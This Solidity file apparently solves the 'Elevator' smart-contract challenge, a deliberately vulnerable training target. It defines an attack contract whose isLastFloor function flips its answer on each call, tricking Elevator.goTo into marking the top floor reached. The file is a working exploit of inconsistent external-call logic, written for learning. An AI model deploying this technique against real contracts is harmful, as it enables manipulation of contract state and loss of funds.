// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Elevator.sol";

/**
 * Exploit Technique: This demonstrates how contracts that depend on multiple external calls
 * to return consistent values can be tricked if the external contract changes state between calls.
 * This is a logic manipulation rather than a classical reentrancy attack.
 */
contract ElevatorAttack {
    // Toggle to simulate inconsistent logic in isLastFloor.
    bool public isLastToggle = true;

    // This function is designed to deceive the Elevator contract.
    // First call returns false (not last floor), second returns true (is last floor).
    function isLastFloor(uint256) public returns (bool) {
        isLastToggle = !isLastToggle; // Toggle between true/false on each call.
        return isLastToggle;
    }

    // Entry point to perform the attack.
    // Passes the address of the vulnerable Elevator contract.
    function attack(address _victim) public {
        Elevator elevator = Elevator(_victim);
        // Calling goTo() with a dummy floor.
        // Due to our toggle logic in isLastFloor, Elevator will believe it reached the top.
        elevator.goTo(10);
    }
}
